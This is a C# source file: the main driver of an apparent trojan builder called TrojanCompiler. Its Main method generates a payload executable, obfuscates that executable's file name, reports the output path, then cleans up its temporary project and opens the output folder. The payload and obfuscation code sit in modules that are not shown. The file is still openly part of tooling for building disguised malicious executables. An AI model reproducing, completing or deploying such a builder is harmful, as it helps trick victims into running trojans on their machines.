using Replay_Trojan;
using System.Configuration;
using System.Diagnostics;
using TrojanPayload;

namespace TrojanCompiler
{
    static internal class CoreCompiler
    {
        // Runtime miscellaneous & configuration statics
        private static string? _NL;
        private static string? _FileExtension;
        private static string? _TemporaryProjectName;
        private static string? _OutputDirectoryName;
        private static string? _OriginalReplayName;
        private static DirectoryInfo? _RootProjectDirectory;


        public static string NL => _NL!;
        public static string FileExtension => _FileExtension!;
        public static string TemporaryProjectName => _TemporaryProjectName!;
        public static string OutputDirectoryName => _OutputDirectoryName!;
        public static string OriginalReplayName => _OriginalReplayName!;
        public static DirectoryInfo RootProjectDirectory => _RootProjectDirectory!;


        /// <summary>
        /// Script entry
        /// </summary>
        private static void Main()
        {
            ProjectConfig();

            string generatedExectuablePath = PayloadCompiler.GenerateInitialPayloadExecutable();
            string obfuscatedExecutablePath = PayloadObfuscation.ObfuscateFileName(generatedExectuablePath);

            Console.WriteLine($"{NL}SUCCESS: Generated executable is located at: {obfuscatedExecutablePath}");

            ExitProgram("SUCCESS: Program exited with error code 0.");
        }


        /// <summary>
        /// Initializes project config variables
        /// </summary>
        private static void ProjectConfig()
        {
            try
            {
                _NL = Environment.NewLine;

                _FileExtension = ConfigurationManager.AppSettings["FileExtension"] ?? "exe";
                _TemporaryProjectName = ConfigurationManager.AppSettings["TemporaryProjectName"] ?? "temp";
                _OutputDirectoryName = ConfigurationManager.AppSettings["OutputDirectoryName"] ?? "output";

                (_OriginalReplayName, _RootProjectDirectory) = IntegrityCheck.ProjectIntegrityCheck();
            }
            catch (Exception e)
            {
                Console.WriteLine($"{NL}{e.Message}");
                ExitProgram("ERROR: Encountered at project configuration.");
            }
        }


        /// <summary>
        /// Program exit message
        /// </summary>
        /// <param name="message"></param>
        public static void ExitProgram(string message)
        {
            TemporaryProjectCleanUp();

            Process.Start("explorer.exe", RootProjectDirectory.FullName);

            Console.WriteLine($"{NL}{message}");
            Console.WriteLine($"{NL}Press any key to close this window!");
            Console.ReadKey();

            Environment.Exit(0);
        }


        /// <summary>
        /// Temporary project clean-up
        /// </summary>
        private static void TemporaryProjectCleanUp()
        {
            try
            {
                Directory.SetCurrentDirectory(RootProjectDirectory.FullName);
                Directory.Delete(Path.Combine(RootProjectDirectory.FullName, TemporaryProjectName), true);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
        }
    }
}
